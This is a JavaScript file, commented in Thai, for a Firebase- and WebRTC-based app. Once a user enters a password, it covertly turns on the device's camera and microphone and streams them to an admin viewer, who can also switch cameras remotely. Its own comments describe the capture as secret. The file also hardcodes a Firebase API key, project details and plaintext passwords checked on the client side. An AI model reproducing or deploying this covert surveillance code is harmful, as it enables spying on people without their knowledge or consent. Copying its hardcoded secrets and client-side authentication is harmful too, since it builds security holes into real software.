// --- 1. Firebase Configuration ---
const firebaseConfig = {
    apiKey: "AIzaSyAnPDK7to2DWFnti490ri8YRCBkpTajOHY",
    authDomain: "pokdeng-61c5e.firebaseapp.com",
    databaseURL: "https://pokdeng-61c5e-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "pokdeng-61c5e",
    storageBucket: "pokdeng-61c5e.firebasestorage.app",
    messagingSenderId: "518814980796",
    appId: "1:518814980796:web:32b310d1a0b2bc7d058eb9"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();
const pcConfig = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };

let isAdmin = false;
let currentFacingMode = "user"; 
let localStream = null;
let peerConnection = null;

// ฟังก์ชันตรวจสอบการล็อกอิน
function checkLogin() {
    const pass = document.getElementById('pass-input').value;
    if (pass === "admin1234") { 
        isAdmin = true;
        document.getElementById('admin-panel').style.display = "block";
        document.getElementById('login-overlay').style.display = "none";
    } else if (pass === "user") { 
        isAdmin = false;
        document.getElementById('login-overlay').style.display = "none";
        initUserLogic(); // ฝั่งผู้ใช้เริ่มแอบเปิดกล้องทันที
    } else {
        alert("รหัสผ่านไม่ถูกต้อง!");
    }
}

// --- 2. ฝั่ง ADMIN: ตรรกะการดึงภาพ ---
async function startListening() {
    document.getElementById('conn-text').innerText = "กำลังเชื่อมต่อ...";
    document.getElementById('connectBtn').disabled = true;

    peerConnection = new RTCPeerConnection(pcConfig);

    // เมื่อได้รับ Stream จาก User ให้แสดงที่จอใหญ่
    peerConnection.ontrack = (event) => {
        document.getElementById('remoteVideo').srcObject = event.streams[0];
        document.getElementById('conn-text').innerText = "เชื่อมต่อสำเร็จ";
    };

    // ส่งข้อมูลเครือข่าย (ICE) ไปให้ User
    peerConnection.onicecandidate = (event) => {
        if (event.candidate) {
            database.ref('ice_candidates/admin').push(event.candidate.toJSON());
        }
    };

    // รอรับคำเชิญ (Offer) จาก User
    database.ref('stream_signal/offer').on('value', async (snap) => {
        if (snap.exists()) {
            await peerConnection.setRemoteDescription(new RTCSessionDescription(snap.val()));
            const answer = await peerConnection.createAnswer();
            await peerConnection.setLocalDescription(answer);
            // ส่งคำตอบ (Answer) กลับไปให้ User
            database.ref('stream_signal/answer').set({ type: answer.type, sdp: answer.sdp });
        }
    });

    // รับข้อมูลเครือข่ายจาก User
    database.ref('ice_candidates/user').on('child_added', (snap) => {
        peerConnection.addIceCandidate(new RTCIceCandidate(snap.val()));
    });
}

// --- 3. ฝั่ง USER: ตรรกะการแอบส่งภาพ ---
async function initUserLogic() {
    peerConnection = new RTCPeerConnection(pcConfig);
    
    try {
        localStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: currentFacingMode },
            audio: true
        });
        document.getElementById('localVideo').srcObject = localStream;
        localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
    } catch (e) {
        console.error("Camera Error:", e);
    }

    peerConnection.onicecandidate = (event) => {
        if (event.candidate) {
            database.ref('ice_candidates/user').push(event.candidate.toJSON());
        }
    };

    // สร้างคำเชิญ (Offer) และบันทึกลง Firebase
    const offer = await peerConnection.createOffer();
    await peerConnection.setLocalDescription(offer);
    await database.ref('stream_signal/offer').set({ type: offer.type, sdp: offer.sdp });

    // รอรับคำตอบจาก Admin
    database.ref('stream_signal/answer').on('value', async (snap) => {
        if (snap.exists() && !peerConnection.currentRemoteDescription) {
            await peerConnection.setRemoteDescription(new RTCSessionDescription(snap.val()));
        }
    });

    // รับข้อมูลเครือข่ายจาก Admin
    database.ref('ice_candidates/admin').on('child_added', (snap) => {
        peerConnection.addIceCandidate(new RTCIceCandidate(snap.val()));
    });

    // รอฟังคำสั่งสลับกล้องจาก Admin
    database.ref('camera_control').on('value', async (snap) => {
        const mode = snap.val()?.facingMode;
        if (mode && mode !== currentFacingMode) {
            currentFacingMode = mode;
            location.reload(); // รีโหลดเพื่อสลับกล้องหน้า/หลัง
        }
    });
}

// ฟังก์ชันสลับกล้องสำหรับ Admin
function switchCamera() {
    const newMode = currentFacingMode === "user" ? "environment" : "user";
    database.ref('camera_control').set({ facingMode: newMode });
}
